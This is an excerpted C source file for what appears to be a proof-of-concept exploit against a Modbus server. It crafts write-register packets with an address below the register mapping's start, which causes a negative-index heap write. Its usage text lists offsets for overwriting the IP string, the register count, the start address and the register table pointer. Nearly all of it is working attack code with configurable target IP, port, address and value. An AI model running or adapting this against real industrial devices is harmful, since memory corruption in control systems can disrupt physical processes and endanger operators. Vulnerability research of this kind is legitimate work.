...
#define DEFAULT_WRITE_ADDR  50      /* Invalid: < START_REGISTERS (triggers CVE) */
#define WRITE_QUANTITY      1       /* Write 1 register */

/* Global configurable parameters */
static int g_write_address = DEFAULT_WRITE_ADDR;
static uint16_t g_write_value = 0xDEAD;  /* Default pattern */
...
static void print_usage(const char *prog) {
    printf("Usage: %s <IP> <PORT> [WRITE_ADDRESS] [WRITE_VALUE]\n\n", prog);
    printf("Arguments:\n");
    printf("  IP            Target IP address\n");
    printf("  PORT          Target port\n");
    printf("  WRITE_ADDRESS Optional: Modbus address to write (default: %d)\n", DEFAULT_WRITE_ADDR);
    printf("  WRITE_VALUE   Optional: 16-bit value to write in hex (default: 0xDEAD)\n\n");
    printf("Examples:\n");
    printf("  %s 127.0.0.1 502              # Default (addr=50, value=0xDEAD)\n", prog);
    printf("  %s 127.0.0.1 502 50           # Corrupt IP string with 0xDEAD\n", prog);
    printf("  %s 127.0.0.1 502 72 0xFFFF    # Set nb_registers to 65535\n", prog);
    printf("  %s 127.0.0.1 502 50 0x3231    # Write ASCII \"21\" to IP string\n", prog);
    printf("\nKnown targets (server start_registers=100):\n");
    printf("  Address 50  -> tab_registers[-50] -> heap (IP string area)\n");
    printf("  Address 72  -> tab_registers[-28] -> mb_mapping->nb_registers\n");
    printf("  Address 74  -> tab_registers[-26] -> mb_mapping->start_registers\n");
    printf("  Address 88  -> tab_registers[-12] -> mb_mapping->tab_registers ptr\n");
}
...
static int build_exploit_packet(uint8_t *buf, size_t bufsize) {
    ...
    buf[idx++] = (g_write_address >> 8) & 0xFF;
    buf[idx++] = g_write_address & 0xFF;
    ...
    /* Write values (configurable pattern) */
    for (int i = 0; i < WRITE_QUANTITY; i++) {
        buf[idx++] = (g_write_value >> 8) & 0xFF;  /* High byte */
        buf[idx++] = g_write_value & 0xFF;         /* Low byte */
    }
...
static void print_packet_info(void) {
    ...
    int mapping_address_write = g_write_address - START_REGISTERS;
    ...
    printf("   mapping_address_write: %d (%s)\n", mapping_address_write,
           mapping_address_write < 0 ? "NEGATIVE - UNDERFLOW!" : "valid");
    printf("\n");
    printf("----------------------------------------\n");
...
int main(int argc, char *argv[]) {
    ...
    /* Optional: configurable write address */
    if (argc >= 4) {
        g_write_address = atoi(argv[3]);
        if (g_write_address < 0 || g_write_address > 65535) {
            fprintf(stderr, "Invalid write address: %s\n", argv[3]);
            return EXIT_FAILURE;
        }
    }

    /* Optional: configurable write value (supports hex with 0x prefix) */
    if (argc >= 5) {
        long val = strtol(argv[4], NULL, 0);  /* Auto-detect base (0x for hex) */
        if (val < 0 || val > 65535) {
            fprintf(stderr, "Invalid write value: %s (must be 0-65535 or 0x0000-0xFFFF)\n", argv[4]);
            return EXIT_FAILURE;
        }
        g_write_value = (uint16_t)val;
    }

    print_banner();
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Write address: %d (offset: %d)\n",
           g_write_address, g_write_address - START_REGISTERS);
    printf("[*] Write value: 0x%04X (%d)\n\n", g_write_value, g_write_value);
